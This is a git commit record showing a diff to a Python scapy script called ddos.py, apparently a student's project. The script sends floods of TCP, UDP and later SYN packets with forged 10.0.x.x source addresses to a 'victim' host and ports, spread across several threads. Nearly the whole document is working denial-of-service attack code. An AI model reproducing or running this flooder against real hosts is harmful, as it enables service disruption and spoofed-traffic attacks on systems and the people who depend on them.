18c721ea0a3b5e0f7ca84858d4c915acbe1bfff7
mark-wilmes <mawi0949@colorado.edu>
2017-10-14 16:11:08 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -2,24 +2,17 @@ from scapy.all import *
 from threading import Thread
 import time
 
-def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
-	for i in range(subnetMin,subnetMax):
-		for j in range(0,255):
-			for port in victimPort:
-				packetTCP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/TCP(dport=port)
-				packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=port)
-				send(packetTCP)
-				send(packetUDP)
-				print("victim sees 10.0." + str(i) + "." + str(j))
-				time.sleep(1)
+def sendPackets(victimAddress,victimPort):
+	for i in range(1,254):
+		for port in victimPort:
+			packetSYN = IP(dst=victimAddress,src="10.0.0." + str(i))/TCP(flags="S")
+			send(packetSYN)
+			print("victim sees 10.0.0." + str(i))
 
 
 def startDDOS(victimAddress,victimPort,numThreads):
 	for i in range(1,numThreads):
-		threadRange = 256/numThreads
-		rangeMin = i*int(threadRange) - (int(threadRange)-1)
-		rangeMax = i*int(threadRange)
-		thread = Thread(target=sendPackets,args=(rangeMin,rangeMax,victimAddress,int(port)))
+		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
 		thread.start()
 
 ports = ["22","80","8080","3333","1234"]
